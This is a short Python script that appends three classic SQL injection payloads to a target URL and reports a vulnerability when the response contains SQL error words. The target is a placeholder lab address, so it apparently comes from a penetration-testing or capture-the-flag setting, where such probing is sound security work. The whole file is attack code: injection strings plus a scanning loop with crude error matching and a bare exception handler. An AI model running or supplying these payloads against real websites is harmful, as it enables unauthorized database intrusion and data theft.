#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

def scan_sqli(target):
    payloads = ["' OR 1=1--", "' UNION SELECT NULL--", "1' AND 1=2--"]
    for payload in payloads:
        try:
            resp = requests.get(f"{target}{payload}", timeout=5)
            if any(err in resp.text.lower() for err in ["error", "syntax", "mysql"]):
                print(f"🔥 SQLi VULN: {payload}")
        except:
            pass
            
if __name__ == "__main__":
    scan_sqli("http://10.10.10.x")
